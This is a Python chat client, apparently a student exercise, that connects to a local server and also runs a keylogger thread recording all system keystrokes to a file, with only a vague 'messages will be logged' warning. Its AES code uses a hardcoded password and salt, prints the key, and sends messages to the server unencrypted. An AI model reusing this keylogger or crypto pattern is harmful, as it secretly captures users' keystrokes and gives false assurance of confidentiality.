import socket
import threading
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2
from pynput.keyboard import Key, Listener
import logging

def keylogger():
    logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
    
    def on_press(key):
        logging.info(str(key))
    
    with Listener(on_press=on_press) as listener :
        listener.join()

#User input for their username
print("WARNING: All messages will be logged!")
nickname = input('Enter your nickname: ')
print("\n")

#Connects the server
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('127.0.0.1', 29392))

#Listens to server and sends user nickname
def receive():
    while True:
        try:
            #Tries to receive message from server
            #If 'NICK' is received, sends nickname
            message = client.recv(1024).decode("ascii")
            if message == 'NICK':
                client.send(nickname.encode('ascii'))
            else:
                print(message)
        except:
            #If there's any error, closes the connection
            print('An error occured!')
            client.close()
            break


def write():
    #.bin format is a safe place to store a key
    KEY_LOCATION = "my_key.bin"

    # Better way to generate the key using PBKDF2
    # Note that PBKDF1 can only generate keys up to 160 bits

    # A salt is random data that is used as an additional input
    # to a one-way function that "hashes" data
    salt_str = "abcde123"
    salt_byte = bytes(salt_str, "utf-8") # convert string to bytes
    password = "Password123"


    key = PBKDF2(password, salt_byte, dkLen=32)


    file_out = open(KEY_LOCATION, "wb") # wb = write bytes
    file_out.write(key)
    file_out.close()

    file_in = open(KEY_LOCATION, "rb") # Read bytes
    key_from_file = file_in.read() # This key should be the same
    file_in.close()

    #To check if the key has been interfered/corrupted
    if key == key_from_file:
        print("Key generated =", key)
        print("Key saved to file", KEY_LOCATION, "and verified successfully")
    else:
        print("There is a problem with the key!")

    #Sends message to the server
    while True:
        message = f'{nickname}: {input("")}'


        #Encrypt
        plaintext = str(message)
        OUTPUT_FILE = "encrypted.bin"

        cipher = AES.new(key, AES.MODE_EAX) # EAX mode using the same key
        ciphered_data, tag = cipher.encrypt_and_digest(bytes(plaintext, "utf-8")) # Encrypt and digest to get the ciphered data and tag

        file_out = open(OUTPUT_FILE, "wb")
        file_out.write(cipher.nonce) # Write the nonce to the output file (will be required for decryption - fixed size)
        file_out.write(tag) # Write the tag out after (will be required for decryption - fixed size)
        file_out.write(ciphered_data)
        file_out.close()

        #Decrypt
        INPUT_FILE = 'encrypted.bin' # Input file (encrypted)

        file_in = open(INPUT_FILE, 'rb')
        nonce = file_in.read(16) # Read the nonce out - this is 16 bytes long
        tag = file_in.read(16) # Read the tag out - this is 16 bytes long
        ciphered_data = file_in.read() # Read the rest of the data out
        file_in.close()

        # Decrypt and verify
        cipher = AES.new(key, AES.MODE_EAX, nonce)
        original_data = cipher.decrypt_and_verify(ciphered_data, tag) # Decrypt and verify with the tag

        if original_data.decode("utf-8") == plaintext:
            client.send(original_data)
        else:
            print("Decrypted data does not match original plaintext!!")



#Starts the thread for listening and writing
write_thread = threading.Thread(target=write)
write_thread.start()

receive_thread = threading.Thread(target=receive)
receive_thread.start()

keylog_thread = threading.Thread(target=keylogger)
keylog_thread.start()